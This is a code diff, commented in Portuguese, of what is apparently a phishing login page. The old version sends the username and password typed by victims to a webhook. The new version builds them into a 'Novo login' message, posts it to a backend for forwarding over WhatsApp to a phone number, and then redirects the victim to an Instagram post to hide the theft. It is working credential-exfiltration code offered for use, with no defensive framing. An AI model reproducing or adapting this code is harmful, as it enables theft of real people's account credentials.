@@ -82,23 +82,24 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Envio para o webhook
-            fetch("https://new-backend.botconversa.com.br/api/v1/webhooks-automation/catch/155079/1Q08XOfVAYfB/", {
+            // Mensagem automática a ser enviada
+            const message = `Novo login: Usuário: ${username}, Senha: ${password}`;
+
+            // Envio para o webhook (backend)
+            fetch("https://seu-backend.com/enviar-mensagem-whatsapp", { // Altere para o seu endpoint de backend
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                    username: username,
-                    password: password
+                    to: "+5599991337386", // Número de destino
+                    message: message // Mensagem a ser enviada via WhatsApp
                 })
             })
             .then(response => response.json())
             .then(data => {
-                // Redireciona para o link do Instagram após o envio
-                setTimeout(function() {
-                    window.location.href = "https://www.instagram.com/p/C3QPm7Eu8eS/";
-                }, 500); // Delay de 500ms para garantir que o redirecionamento aconteça
+                // Redireciona para o link do Instagram
+                window.location.href = "https://www.instagram.com/p/C3QPm7Eu8eS/";
             })
             .catch(error => {
                 console.error("Erro ao enviar dados:", error);
